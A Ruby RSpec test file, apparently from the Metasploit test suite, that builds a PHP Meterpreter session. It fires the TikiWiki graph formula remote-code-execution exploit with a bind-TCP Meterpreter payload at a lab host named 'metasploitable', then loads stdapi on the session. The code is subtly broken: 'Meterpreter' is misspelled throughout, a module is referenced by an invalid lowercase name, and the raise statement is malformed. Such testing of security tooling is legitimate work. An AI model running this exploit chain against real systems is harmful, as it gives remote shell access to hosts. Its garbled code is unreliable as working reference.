$:.unshift(File.join(File.dirname(__FILE__)))
$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'lib'))
$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', 'test', 'lib'))

require 'fileutils'
require 'msf/base'
require 'meeterpeter_spec_helper'
require 'meeterpeter_specs'

module MsfTest

describe "Phpmeeterpeter" do
  
  # This include brings in all the spec helper methods
  include MsfTest::meeterpeterSpecHelper
  
  # This include brings in all the specs that are generic across the 
  # meeterpeter platforms
  include MsfTest::meeterpeterSpecs

  before :all do
    @verbose = true
  
    @meeterpeter_type = "php"
    
    ## Set up an outupt directory
    @output_directory = File.join(File.dirname(__FILE__), "test_output_#{@meeterpeter_type}")

    if File.directory? @output_directory
      FileUtils.rm_rf(@output_directory)
    end

    Dir.mkdir(@output_directory)
    @default_file = "#{@output_directory}/default"

    create_session_php
  end

  before :each do

  end

  after :each do
    @session.init_ui(@input, @output)
  end
  
  after :all do
    FileUtils.rm_rf(@output_directory)
  end

  
  def create_session_php

    ## Setup for php
    @framework    = Msf::Simple::Framework.create
    
    @exploit_name = 'unix/webapp/tikiwiki_graph_formula_exec'
    @payload_name = 'php/meeterpeter/bind_tcp'
    @input        = Rex::Ui::Text::Input::Stdio.new 
    @output       = Rex::Ui::Text::Output::File.new(@default_file)

    # Initialize the exploit instance
    exploit = @framework.exploits.create(@exploit_name)

    ## Fire it off against a known-vulnerable host
    @session = exploit.exploit_simple(
      'Options'     => {'RHOST' => "metasploitable"},
      'Payload'     => @payload_name,
      'LocalInput'  => @input,
      'LocalOutput' => @output)

    puts @session.inspect

    ## If a session came back, try to interact with it.
    if @session
      @session.load_stdapi
    else
      raise Exception "Couldn't get a session!"
    end
  end
  
end
end
